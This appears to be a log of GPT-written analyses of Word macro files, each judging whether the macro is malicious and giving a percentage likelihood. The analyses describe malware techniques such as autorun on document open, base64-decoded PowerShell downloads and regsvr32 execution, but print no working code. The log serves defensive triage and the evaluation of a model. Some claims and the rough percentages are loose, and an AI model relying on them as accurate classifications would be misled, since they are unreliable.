3. The use of the 'ShellExecute' method from Shell.Application COM object suggests that an external file or application will be executed.

4. Lastly, the fact that the code is running upon document opening (Document_Open) is another significant hint. Commonly, this is used as a method by malicious macros to execute immediately once a document is opened.

It is necessary to further investigate the URL and downloaded file to confirm maliciousness accurately. It is also suggested to run this macro code in an isolated environment (sandbox) if further inspection is required.
================================================================================

File: qq.docm
GPT's analysis:
Upon examining the VBA (Visual Basic for Applications) code above, it appears to be relatively benign. The script inserts an image at the point in a document where text is selected at the moment of execution. This is triggered based on user input and does not contain any overtly harmful or suspicious instructions.

However, this does not guarantee it's entirely risk-free. It is always possible for a malicious actor to misuse such scripts. For instance, the macro asks the user to provide a path that might potentially allow a harmful file to be loaded if the imagePath variable isn’t sanitized properly. This input could potentially be misused to attempt a directory traversal attack.

This being said, based on the review of the provided VBA code, it appears that there's approximately a 10% chance of the macro being harmful, as it only accepts and uses user inputs without any explicit malicious activities like writing sensitive data, changing system settings, or spreading malware. It is always good to inspect any software or scripts that modify your files, and in an optimal security setting, this code would control and limit user input more strictly.
================================================================================

File: ss.docm
GPT's analysis:
After analyzing both the VBA scripts, they appear non-malicious due to:

1. The first script defines standard attributes of a Word VBA project. None of these attributes indicate any harmful intent or suspicious activity.

2. The second script is a subroutine named "Count word Occurrences". From reviewing this code, it's clear that its main operation is to count the occurrence of a particular word ("placeholder") within the paragraphs of an active document. It does not involve any harmful actions such as file modification, system access, network access, or any form of exploitation.

So, I would estimate a 0% likelihood of this particular VBA code being malicious based on current analysis. But, as always with IT security, there's more than meets the eye. If the code is part of a larger project, there could still be other parts with malicious intent. It's always best practice to maintain vigilance over external sources of code.
================================================================================

File: 23.docm
GPT's analysis:
This VBA macro seems to be highly malicious. It includes shell execution code, base64 encoding, and potentially dangerous actions performed upon document opening. 

Analyzing the code, it can be seen that a function 'sadsad' is used to decode quite a complex base64 string using 'Msxml2.DOMDocument' object under the pretext of creating an 'aux' element. The base64 string is suspicious because typically, base64 is used to encode malware strings to evade detection by security tools. 

This decoded string is later used as an argument to the Shell function, which is a dangerous function as it can execute OS commands and applications, opening a huge vulnerability gate. This gate can further lead to remote code execution or arbitrary code execution allowing an attacker to execute commands of his choice. 

These functionalities wrapped up in a Document_Open event handler means the malicious actions would automatically be triggered when the document is opened. 

Based on these facts, it can be confidently said that the likelihood of this VBA macro being malicious is near 100%. However, the actual nature and extent of the harmful actions likely depend on the contents of the base64 string and what the shell function is executing.
================================================================================

File: 68.docm
GPT's analysis:
Upon analyzing the VBA code described, it can be concluded that it has certain malicious elements. 

The section of the code where it creates an instance of the FileSystemObject and writes to a text file can be potentially harmful if the input is manipulated to write unwanted data. The script runs the WScript.Shell method, which is mostly used for executing command line commands. It further fetches custom properties from the document and writes them into a file. Depending on the type of data stored in these custom properties, it may pose a security risk.

Secondly, the code attempts to use WMI service (Windows Management Instrumentation Service) in order to execute an application. It then calls the Winmgmts interface. This feature is most often used in scripts for administrative tasks. However, it can also be used for malicious activities like executing trojans or other applications from untrustworthy sources. 

On a portion of the script you'll see, "wscript /E:vbscript " + tfname". This command is used to execute the content of a file as VBScript which is a scripting language developed by Microsoft. If tfname contains malicious code, then it will run on your machine, posing a significant security threat.

Based on this information, it is safe to say that it can potentially be 90% harmful. However, this estimate is based on the presented attributes and script and would change according to actual usage and parameters/input controlled by the properties of the VB script.
================================================================================

File: 77.docm
GPT's analysis:
Upon analyzing the given VBA code, multiple red flags indicating probable malicious intent are noted:

1. The code tries to check the presence of ".gattaka" file. This could be an effort to hinder sandbox detection and analysis used by many antivirus and cybersecurity tools for malware detection. 

2. An opaque data transformation function (`tylkftcicrjxfvkh`) is used, which might be used to obfuscate string constants within the macro or to decode some sort of payload. 

3. The code uses `GetObject` to retrieve WMI (Windows Management Instrumentation) objects with obfuscated paths likely to create and launch a process with the help of `SpawnInstance_` method. 

4. Another obfuscated string likely defining a path to an executable file is combined with the previously transformed data (possibly a malware payload), hinting that the code may create a process to execute a malware file.

5. The `Document_Open` and `yoxtuitsmsvbjfepuxc` methods call the same procedure (`zwxcnxajcshyp`) which further suggests this macro may be designed to execute malicious activities immediately upon opening the document or triggering specific events.

6. Lastly, the strange function names like "obiwgfhsha", and "ylpdfpnmlbmswkm" resemble auto-generated names rather than human naming, which can be another characteristic of obfuscated malicious code.

Given these indicative factors, it seems highly likely that this code is malicious. So, the probability of it being harmful is estimated to be around 90%. However, a definitive conclusion would require an in-depth dynamic analysis in a controlled and isolated environment.
================================================================================

File: b.docm
GPT's analysis:
Upon inspection, there doesn't seem to be anything malicious about this VBA code snippet. This Visual Basic for Applications (VBA) macro is designed to react when the content within a designated bookmark in a Word document changes. When a change is detected, the macro updates a barcode object with the new text. It's outfitted with a timer that checks for changes in the bookmark's content every second.

There are no indications of harmful actions here, such as file deletions/alterations, data extraction or network communications, or setting/installing other potentially risky macros or software. The macro appears to be built for a legitimate purpose - to dynamically update a barcode based on the content of a document.

However, while it might look harmless, caution should be exercised with macros in general. Malicious macros are a common method for injecting malware (via e.g., ransomware, trojans, etc.) into a system.

In this case though, the percentage likelihood of this piece of VBA being malicious is 0% based on the provided code.
================================================================================

File: g.docm
GPT's analysis:
Based on the provided code, there is not enough evidence to classify this VBA (Visual Basic for Applications) script as malicious. This code appears to be handling the updating of a barcode on a document and prompting a user to save a file if it has not been saved. 

The snippet interacts with an ActiveDocument – a document that is currently open in the host application, presumably Microsoft Word. It does not contain known malicious functions such as file operations, shell commands, website navigation, sending emails, or modifying registry keys, which are typical in VBA malware. It does not seem to contain any features designed for evasion, persistence, or exploit use typical of malicious macros.

So, the potential for this code being harmful could be estimated as less than 1% based solely on the given information. However, keep in mind that absence of apparent harmful activity in this code snippet doesn't mean the whole application is benign. Other sections of the application not provided might contain potentially malicious VBA scripts. A comprehensive security audit of the complete application is recommended for a definite conclusion.

GPT's analysis:
From the provided VBA code, it appears to be a simple macro script designed to format headings in a Word document to a specific style ("Heading 2") and then display a message box indicating the action has been completed. 

Without further context, no harmful actions such as file deletion, network scanning, sensitive data exfiltration, or unauthorized system access is apparent in the code. That's not to say there isn't potential for misuse. If this script is embedded in a document without the user's knowledge and executes without their consent, it can be considered unwanted behavior, technically making it a form of malware. However, the code doesn't seem to contain typical malicious activities.

Hence, based on this analysis, there is about a 0% probability of this code being malicious in a traditional sense of causing harm to a user's system. But it's critical to know that any VBA macro can pose a risk if there's a lack of transparency around its purpose or if it executes without the user's knowledge.
================================================================================

File: 94.docm
GPT's analysis:
The given VBA code gives an impression of malicious intent due to its actions. It is set to auto run whenever its parent Word document is opened. It then makes a download request from a specific URL to get an executable file. 

The downloaded file is then saved in the system's ProgramData folder, which is a system folder not normally visible to users. The location choice can be construed as sneaky and unusual for legitimate downloads.

After saving the file, it then calls the shell to execute that file. Unless there is a clear and benign reason, downloading and executing an unknown executable from internet, especially from a raw IP address rather than a domain with a known reputation, is often associated with malicious behavior. 

While VBA code in itself is not malicious, it is what the code does that can make it harmful. And in this case, the auto-download and execution of an executable file makes it highly suspicious. It's not possible to definitively score the likelihood of malice without further details but given the indicators, it's about 95% likely to be malicious.
================================================================================

GPT's analysis:
The VBA code doesn't appear to be malicious. There's no potential harmful action to be found. 

The macro in Module1 generates a Table of Contents (TOC) for the active document and updates it accordingly. It's just utilizing built-in Word functions for TOC actions, such as adding and updating TOC. There are no file manipulations, registry manipulations, or internet communications happening here.

Likelihood of being malicious: 0%
================================================================================

File: 47.docm
GPT's analysis:
After reviewing the provided VBA code snippet, there are several operations that signal likely malicious activities:

1. The VBA code includes the use of external libraries such as Kernel32.DLL with suspiciously named functions. Kernel32.dll is a Windows operating system file. However, it can also be abused by malicious code to perform harmful actions.

2. The VBA calls functions such as "CreateFileA", "WriteFile", "CloseHandle" which indicates manipulation of files. These methods can be used for legitimate activities but can also be abused to generate, modify, or delete files without the user's knowledge.

3. The VBA code includes an snprintf function that encrypts/decrypts data using XOR functions. This could suggest that malicious data or instructions are being hidden in this script.

4. During document open, the script calls a method that shows an error message misleading the user that the document version is not compatible with their current word version.

5. The code calls a FR function from "cmpbk64" library, which is not a standard library in Windows that might signal potential malware execution.

It's hard to give a concrete percentage estimate, but all these indicators lean toward the reasonable likelihood that the provided VBA code is malicious. Let's say 85% likelihood as it shows a strong tendency towards harmful actions but without complete context and further analysis. 

Best practice would be to refrain from running such code until it is thoroughly inspected for malicious functionality.
================================================================================

File: 37.docm
GPT's analysis:
The VBA code provided here demonstrates several potential signs that could be indicative of malicious intent. Some suspicious activities to consider are:

1. The code utilizes the "On Error Resume Next" statement frequently. This can be often used in malware to bypass errors that may arise during the execution and prevent the full execution of the script.

2. The code uses the "CreateObject" function to create instances of objects/users without any clear purpose.

3. The code seems to be interacting with some other userforms and it's using several controls and properties from those userforms which could be fetching some sensitive data.

4. It also appears to be programmatically interacting with applications, files, and system settings without any clear purpose. It includes actions like workbook opening, control value adjustment, and setting application options like "GridDistanceHorizontal", "UpdateLinksAtOpen", etc.

5. The code is obfuscated, which can make it difficult to determine what it is actually doing, and is a common strategy in malicious code.

6. It also seems to use the forms in the document as a sort of storage for data, possibly even for storing malicious payloads.

7. There're also signs of attempts to conceal actions by manipulating visibility (display alerts manipulation) and tweaking application options values.

However, it's worth noting that this analysis doesn't necessarily confirm the code as being malicious. It is highly recommended that this code is sent to a sandboxed environment for a more precise dynamic analysis. 

Given these signs, I would estimate the likelihood of this code being malicious at approximately 80%.

================================================================================

File: 87.docm
GPT's analysis:
Analyzing the code reveals several suspicious behaviors that are often seen in malicious scripts. 

1. The code includes calls to 'CreateObject' method which is notorious for potential misuse by attackers to instantiate objects from ActiveX classes. This can be used to interact with the system in potentially dangerous ways, such as tampering with registry keys or file execution.
   
2. Utilization of disguised request to an external server "bushidotactical.com" and an attempt to send data through it could signify potential data exfiltration.

3. The strings in the code are heavily obfuscated with the use of the custom function 'GodnTeBabenParama'. Obfuscation is a technique commonly used by attackers to hide malicious intent.

4. The code contains a 'Shell' call which can be used to execute arbitrary command line commands, and this is a common method used for various malicious purposes, such as running malware or other unauthorized activities.

Considering the aforementioned points, the likelihood of the code being malicious is fairly high. It is impossible to accurately determine a percentage likelihood without specific scanning tools, but based on the code analysis alone, it appears to be in the range of 70%-80% likely to be malicious. Lastly, as with all analyses of this nature, it's recommended to test the Macro in a secure, sandboxed environment, or utilize an antivirus scanning tool for more detailed results.
================================================================================

File: 83.docm
GPT's analysis:
Upon analyzing the Visual Basic for Applications (VBA) code that is a part of a Word macro, it is clear that it contains harmful actions that are typical for malware.

The function 'sadsad' apparently decodes a Base64-encoded command (present as a long string in the 'Document_Open' sub), while the functions 'UpIWzevnZeXJNGnusotcnuaISOodMFKsEMbQiHFeZFJyyprreRJtobt' and 'ZPzDlLRbUTzZVerhGiPYikwfxrwTQQmDdTBBiDoSHeKfylqMIjYfZCL' are used in the conversion of string data and stream manipulation that aid in the decoding process.

The decoded command runs 'powershell.exe' with a bypass execution policy. This will allow the execution of scripts regardless of the system's script execution policies. Then, it uses PowerShell's 'DownloadFile' method to download a file from a specific URL and runs it. The URL in this code appears to download an Executable (.exe) file, which is a common method of introducing malware into a system - though we cannot confirm that the downloaded file is malicious from this code alone.

Given the use of obfuscation, Base64 encoding, downloading and executing a file from the internet, and other indicators such as the overuse of random string names, I would consider this code to have about 95% likelihood to be malicious. My suspicion might only be alleviated by a very compelling and well-documented business case for this code's existence, which is unlikely given normal business operations. 

However, a full investigation should be undertaken by a professional cybersecurity team. They ideally should check where the mentioned .exe file gets downloaded from and what its exact function is.

GPT's analysis:
This VBA code doesn't seem to have malicious content. It appears to be a simple script designed to insert placeholders at the beginning of every paragraph in the active word document, along with an optional feature for inserting a comment. However, it should be noted that any VBA code could potentially be harmful if it is altered or used as part of a larger harmful code. 

Estimated likelihood of this code being harmful: 0%

However, as an IT security analyst, it is important to enforce that proper security measures are followed when dealing with VBA scripts or any type of executable code. These precautions would include running the code in a secure testing environment, verifying the source of any downloaded scripts, and maintaining up-to-date anti-malware software on all systems.

GPT's analysis:
This VBA code appears to have the potential to be harmful. The code contains functionality that downloads a file from an obfuscated URL and executes it. Here are some potential malicious behaviors it exhibits:

1. Function `autoopen` is a well-known entry point that loads when a document is opened. It contains a reference to an obfuscated URL through the `i(c4)` and downloads a PDF file named "Ub.pdf".
  
2. The `download` method in `frm` makes use of `URLDownloadToFile` function which is a known method for downloading files from the internet. It could be used to download and/or execute potentially malicious code.

3. After the file is downloaded, it is likely run using `Call T8.run(hn & m & "32 " + D)`. In this case, it appears to be trying to run the file through regsvr32 which is a method of execution that can bypass certain security measures.

4. The public constants `hn`, `m` and `c4` in the MR module are used to obfuscate what is being run.

However, due to the fact that these macros likely require user interaction (need to be manually run) and that there are no obvious harmful payloads encrypted in them (like stealing data, IP tracking), I'd say the chance that this is malicious is about 70%. Note, the harmfulness of this depends on what the downloaded files are and whether they are harmful or not. Proper analysis would require knowing/interpreting the content at the URL specified by the obfuscated string. The string comments throughout the code don't seem to hold any functionality or hide something, they seem more like dummy or placeholder text. 

Keep in mind that while a 70% estimate shows strong suspicion of potentially harmful actions, a full determination would require a more in-depth analysis and possibly even dynamic analysis (actually running the code in a controlled environment).
